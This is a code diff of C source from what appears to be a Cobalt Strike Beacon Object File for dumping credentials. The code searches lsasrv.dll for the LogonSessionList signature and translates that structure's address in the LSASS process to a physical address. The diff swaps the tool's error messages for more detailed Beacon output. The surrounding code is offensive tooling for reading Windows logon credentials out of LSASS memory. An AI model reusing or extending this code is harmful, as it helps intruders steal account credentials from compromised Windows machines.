@@ -65,7 +65,7 @@ DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWO
     PBYTE lsasrvImageBase = (PBYTE)GetModuleHandleA("lsasrv.dll");
     if (lsasrvImageBase == NULL)
     {
-        BeaconFormatPrintf(&outputbuffer, "Failed to get lsasrv DLL address!\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to get lsasrv.dll address!\n");
         return 0;
     }
 
@@ -79,9 +79,10 @@ DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWO
     //
     DWORD LogonSessionListSigOffset = SearchPattern(lsasrvTextBase, lsasrvTextSize, LogonSessionListSig, SigSize);
     if (LogonSessionListSigOffset == 0) {
-        BeaconFormatPrintf(&outputbuffer, "Could not find offset to LogonSessionList\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Could not find LogonSessionList signature in lsasrv.dll (build %lu)!\n", dBuildNumber);
         return 0;
     }
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Found LogonSessionList signature at offset 0x%lx.\n", LogonSessionListSigOffset);
 
     //
     // If we found the pattern we can proceed with getting the actual address
@@ -110,9 +111,10 @@ DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWO
     DWORD64 LogonSessionListPA = 0;
     if (!TranslateUVA2Physical(Real_LogonSessionList_Address, &LogonSessionListPA, lower32bits, LsassPID))
     {
-        BeaconFormatPrintf(&outputbuffer, "[!] Failed to transate LogonSessionList VA to PA!\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to translate LogonSessionList VA 0x%llx to PA!\n", Real_LogonSessionList_Address);
         return 0;
     }
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] LogonSessionList PA: 0x%llx\n", LogonSessionListPA);
 
     //
     // Validate the obtained address; very minimal check
@@ -120,7 +122,7 @@ DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWO
     //
     if (!IsEntryValid(hFile, LogonSessionListPA, lower32bits, LsassPID, ImageStartAddress))
     {
-        BeaconFormatPrintf(&outputbuffer, "[!] Could not validate LogonSessionList!\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Could not validate LogonSessionList entry at PA 0x%llx!\n", LogonSessionListPA);
         return 0;
     }
     
